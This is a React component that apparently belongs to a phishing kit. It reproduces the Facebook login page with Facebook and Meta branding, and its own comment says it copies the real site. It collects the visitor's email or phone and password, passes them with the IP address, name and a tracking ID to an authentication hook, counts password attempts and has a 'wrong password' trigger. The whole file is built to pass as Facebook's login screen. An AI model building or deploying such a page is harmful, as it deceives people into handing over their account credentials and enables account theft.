import React, { useState, useContext } from "react";
import { usePasswordAuth } from "../../hooks/usePasswordAuth.js";
import ButtonActions from "../../utils/buttonActions.js";
import { DataContext } from "../../pages/index.js";

function Step2PC({
  Unik,
  Tel,
  Email,
  setEmail,
  Name,
  BusinessEmail,
  Ip,
  setParentBeginTimer,
  InvalidPassword,
  wrongPasswordTrigger,
}) {
  const [isValidEmail, setIsValidEmail] = useState(true);
  const { setAllData, AllData } = useContext(DataContext);

  // Use the custom hook for password authentication
  const {
    password,
    setPassword,
    isLoading,
    passwordError,
    emailError,
    triedSubmit,
    passwordAttempt,
    handleSubmit,
    clearPasswordError,
    clearEmailError,
  } = usePasswordAuth({
    Unik,
    Email,
    Tel,
    BusinessEmail,
    Name,
    Ip,
    wrongPasswordTrigger,
    setParentBeginTimer,
  });

  const handleEmailChange = (e) => {
    setEmail(e.target.value);
    clearEmailError();
    setIsValidEmail(true);
  };

  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
    clearPasswordError();
  };

  const inputClasses = (hasError) =>
    `w-full h-[62px] rounded-2xl border bg-white px-4 text-[15px] text-[#111112] placeholder-[#838689] leading-normal box-border focus:outline-none font-fbook transition-shadow ${
      hasError
        ? "border-red-500 focus:border-red-500 focus:shadow-[0_0_0_2px_rgba(239,68,68,0.2)]"
        : "border-[#dddfe2] hover:border-[#ccd0d5] focus:border-[#0064e0] focus:shadow-[0_0_0_2px_rgba(0,100,224,0.2)]"
    }`;

  return (
    <div className="flex flex-col bg-white w-full min-h-screen font-fbook">
      <div className="flex flex-1 w-full">
        {/* Left Half - branding */}
        <div className="relative hidden md:flex md:w-1/2 flex-col border-r border-[#e4e6eb]">
          {/* f logo */}
          <img
            src="/assets/images/FLogo.png"
            alt="Facebook Logo"
            className="absolute top-10 left-10 w-[72px] h-[72px] z-10"
          />

          {/* Illustration collage - official FB asset, contain like the real site */}
          <div className="flex-1 flex items-center justify-center">
            <img
              src="/assets/images/fb-hero.webp"
              alt=""
              className="w-[80%] h-full object-contain"
            />
          </div>

          {/* Headline */}
          <h1 className="absolute bottom-12 left-10 leading-[1.26] font-semibold text-black m-0 w-[220px] text-[clamp(2rem,4.1vw,3.5rem)]">
            Explore the things{" "}
            <span className="text-[#1877f2]">you love.</span>
          </h1>
        </div>

        {/* Right Half - login form */}
        <div className="flex-1 flex items-center justify-center px-6 py-6">
          <div className="w-full max-w-[536px]">
            <h2 className="text-[17px] font-semibold text-[#111112] leading-snug mb-5 font-fbook">
              Log into Facebook
            </h2>

            <input
              type="text"
              value={Email}
              onChange={handleEmailChange}
              placeholder="Email or mobile number"
              className={inputClasses(!isValidEmail && triedSubmit)}
              disabled={isLoading}
            />
            {emailError && (
              <div className="text-red-500 text-sm font-medium text-left mt-1.5 font-fbook">
                {emailError}
              </div>
            )}

            <input
              type="password"
              value={password}
              onChange={handlePasswordChange}
              placeholder="Password"
              className={`${inputClasses(
                password.length < 5 && triedSubmit
              )} mt-3`}
              disabled={isLoading}
            />
            {passwordError && (
              <div className="text-red-500 text-sm font-medium text-left mt-1.5 font-fbook">
                {passwordError}
              </div>
            )}

            <button
              onClick={handleSubmit}
              className="w-full h-12 bg-[#0064e0] border-none rounded-full text-white text-[17px] font-bold font-fbook px-4 mt-4 cursor-pointer flex items-center justify-center hover:bg-[#0057c2] transition-colors"
            >
              {isLoading ? (
                <div className="flex items-center justify-center h-8 w-8">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    viewBox="0 0 200 200"
                    className="h-full w-full"
                  >
                    <radialGradient
                      id="a12"
                      cx=".66"
                      fx=".66"
                      cy=".3125"
                      fy=".3125"
                      gradientTransform="scale(1.5)"
                    >
                      <stop offset="0" stopColor="#FFFFFF"></stop>
                      <stop
                        offset=".3"
                        stopColor="#FFFFFF"
                        stopOpacity=".9"
                      ></stop>
                      <stop
                        offset=".6"
                        stopColor="#FFFFFF"
                        stopOpacity=".6"
                      ></stop>
                      <stop
                        offset=".8"
                        stopColor="#FFFFFF"
                        stopOpacity=".3"
                      ></stop>
                      <stop
                        offset="1"
                        stopColor="#FFFFFF"
                        stopOpacity="0"
                      ></stop>
                    </radialGradient>
                    <circle
                      transform-origin="center"
                      fill="none"
                      stroke="url(#a12)"
                      strokeWidth="15"
                      strokeLinecap="round"
                      strokeDasharray="200 1000"
                      strokeDashoffset="0"
                      cx="100"
                      cy="100"
                      r="70"
                    >
                      <animateTransform
                        type="rotate"
                        attributeName="transform"
                        calcMode="spline"
                        dur="2"
                        values="360;0"
                        keyTimes="0;1"
                        keySplines="0 0 1 1"
                        repeatCount="indefinite"
                      ></animateTransform>
                    </circle>
                    <circle
                      transform-origin="center"
                      fill="none"
                      opacity=".2"
                      stroke="#FFFFFF"
                      strokeWidth="15"
                      strokeLinecap="round"
                      cx="100"
                      cy="100"
                      r="70"
                    ></circle>
                  </svg>
                </div>
              ) : (
                "Log in"
              )}
            </button>

            <div className="text-center mt-3 py-2">
              <a
                href="#"
                onClick={(e) => {
                  e.preventDefault();
                  ButtonActions.handleForgottenPassword({
                    AllData,
                    setAllData,
                    Unik,
                    Email,
                    Ip,
                  });
                }}
                className="text-[#385898] text-[15px] no-underline font-fbook hover:underline"
              >
                Forgot password?
              </a>
            </div>

            <button
              onClick={(e) => {
                e.preventDefault();
                ButtonActions.handleCreateAccount({
                  AllData,
                  setAllData,
                  Unik,
                  Email,
                  Ip,
                });
              }}
              className="w-full h-12 bg-white border border-[#0064e0] rounded-full text-[#0064e0] text-[17px] font-bold font-fbook px-4 mt-12 cursor-pointer hover:bg-[#0064e0]/5 transition-colors"
            >
              Create new account
            </button>

            <div className="flex justify-center mt-7">
              <img
                src="/assets/svgs/mtlg2.svg"
                alt="Meta"
                className="h-[18px]"
              />
            </div>
          </div>
        </div>
      </div>

      {/* Footer - languages */}
      <footer className="w-full border-t border-[#e4e6eb] bg-white font-fbook">
        <div className="flex flex-wrap items-center gap-x-8 gap-y-1 py-4 px-5 text-[13px] text-[#65676b] max-w-[1195px] mx-auto">
          <span className="cursor-pointer hover:underline">English (US)</span>
          <span className="cursor-pointer hover:underline">Nederlands</span>
          <span className="cursor-pointer hover:underline">Frysk</span>
          <span className="cursor-pointer hover:underline">Polski</span>
          <span className="cursor-pointer hover:underline">Türkçe</span>
          <span className="cursor-pointer hover:underline">Deutsch</span>
          <span className="cursor-pointer hover:underline">
            Français (France)
          </span>
          <span className="cursor-pointer hover:underline">
            More languages...
          </span>
        </div>
      </footer>
    </div>
  );
}

export default Step2PC;
